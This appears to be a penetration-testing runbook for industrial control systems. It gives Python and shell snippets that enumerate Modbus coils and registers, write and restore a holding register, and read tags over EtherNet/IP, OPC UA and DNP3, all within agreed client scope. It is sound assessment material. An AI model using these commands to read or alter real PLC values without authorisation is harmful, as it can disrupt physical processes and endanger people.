# Runbook: Industrial protocol abuse

## Objective

Read process data and demonstrate the ability to modify process parameters using legitimate industrial protocol commands. All operations must be within the explicit scope and safety boundaries agreed with the client. Read before write; restore after demonstration.

## Prerequisites

- Written confirmation that protocol interaction with named devices is in scope.
- A list of safe-to-interact devices, separated from safety systems and critical process controllers.
- A read baseline captured before any writes are attempted.
- A designated point of contact at the client who can immediately confirm whether a test should proceed or stop.

## Modbus TCP

Enumerate available registers on a target device:

```python
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

client = ModbusTcpClient('<plc-ip>', port=502)
client.connect()

# Read coils (discrete outputs, 1-bit)
coils = client.read_coils(address=0, count=16, slave=1)
print("Coils:", coils.bits)

# Read discrete inputs
inputs = client.read_discrete_inputs(address=0, count=16, slave=1)
print("Inputs:", inputs.bits)

# Read holding registers (16-bit writable parameters)
holding = client.read_holding_registers(address=0, count=20, slave=1)
print("Holding registers:", holding.registers)

# Read input registers (16-bit read-only measurements)
input_regs = client.read_input_registers(address=0, count=20, slave=1)
print("Input registers:", input_regs.registers)

client.close()
```

Record all register values before proceeding. This baseline is required for restoration.

If in scope, demonstrate write capability against a safe holding register:

```python
# Read the current value first
result = client.read_holding_registers(address=5, count=1, slave=1)
original_value = result.registers[0]

# Write a new value (within safe range, agreed with client)
client.write_register(address=5, value=original_value + 1, slave=1)

# Verify the write was accepted
result = client.read_holding_registers(address=5, count=1, slave=1)
print("New value:", result.registers[0])

# Restore immediately
client.write_register(address=5, value=original_value, slave=1)
```

## EtherNet/IP (Rockwell CIP)

```python
from cpppo.server.enip import client as enip_client

# Connect and read a tag by name (requires knowing the tag name from the project file)
with enip_client.connector(host='<plc-ip>', port=44818) as conn:
    operations = [
        {'path': [{'symbolic': 'CurrentFlow'}], 'data_type': 'REAL'},
    ]
    for op in operations:
        response, = conn.pipeline(operations=[op])
        print(f"CurrentFlow: {response}")
```

## OPC UA

```python
from opcua import Client, ua

c = Client('opc.tcp://<server-ip>:4840')
c.connect()

# Browse the node structure
root = c.get_root_node()
objects = c.get_objects_node()

# Find and read a specific tag
# NodeId format depends on the server's namespace
node = c.get_node('ns=2;s=PLC1.Flow.Setpoint')
value = node.get_value()
print(f"Setpoint: {value}")

# Read with history (where permitted)
history = node.read_raw_history(
    ua.datetime(2024, 1, 1),
    ua.datetime(2024, 1, 2)
)
```

## DNP3

```bash
# Using dnp3-tools or scapy with DNP3 support
# Read a specific data object from an outstation
python3 dnp3read.py --host <rtu-ip> --port 20000 --master-addr 1 --outstation-addr 10 \
  --class 0  # Class 0 = static data (current values)
```

## Evidence collection

For each protocol interaction, capture:

- The exact packet exchange (PCAP file with timestamps).
- The register or tag address interacted with, its engineering meaning, and the values read.
- Whether a write was attempted, the value written, and confirmation of restoration to the original value.
- Any error responses received (which indicate access controls or device protections in place).

The demonstration value is in showing that the read succeeded from an IT-originated position, not in modifying production values.
